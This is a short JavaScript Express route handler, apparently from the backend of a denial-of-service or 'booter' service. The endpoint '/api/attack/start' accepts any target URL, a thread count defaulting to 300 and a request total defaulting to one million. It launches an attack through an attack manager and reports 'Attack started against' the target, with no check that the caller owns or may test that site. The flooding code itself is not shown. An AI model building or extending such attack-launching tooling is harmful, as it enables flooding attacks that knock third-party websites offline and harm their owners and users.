app.post('/api/attack/start', async (req, res) => {
  try {
    const { targetUrl, threads = 300, totalRequests = 1000000, userId = 'api_user' } = req.body;
    
    if (!targetUrl) {
      return res.status(400).json({ error: 'Target URL is required' });
    }

    const attack = await attackManager.startAttack(
      userId,
      targetUrl,
      threads,
      totalRequests,
      null
    );

    res.json({
      success: true,
      attackId: attack.id,
      message: `Attack started against ${targetUrl}`,
      details: {
        threads: attack.threads,
        totalRequests: attack.totalRequests,
        startTime: new Date(attack.startTime).toISOString()
      }
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

